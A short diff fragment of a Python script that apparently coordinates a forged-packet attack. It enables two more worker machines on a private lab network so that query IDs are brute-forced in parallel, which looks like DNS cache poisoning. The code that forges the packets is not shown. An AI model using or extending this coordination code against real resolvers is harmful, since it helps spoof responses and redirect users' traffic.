@@ -18,5 +18,5 @@ if __name__ == "__main__":
 			print("Malicious packet will be forged and sent - QID " + str(qid))
 			
 			threading.Thread(target=requests.get, args=('http://192.168.0.160:8888?start_qid=' + str(qid),)).start()
-			#threading.Thread(target=requests.get, args=('http://192.168.0.161:8888?start_qid=' + str(qid-1000),)).start()
-			#threading.Thread(target=requests.get, args=('http://192.168.0.162:8888?start_qid=' + str(qid+1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.0.161:8888?start_qid=' + str(qid-1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.0.162:8888?start_qid=' + str(qid+1000),)).start()
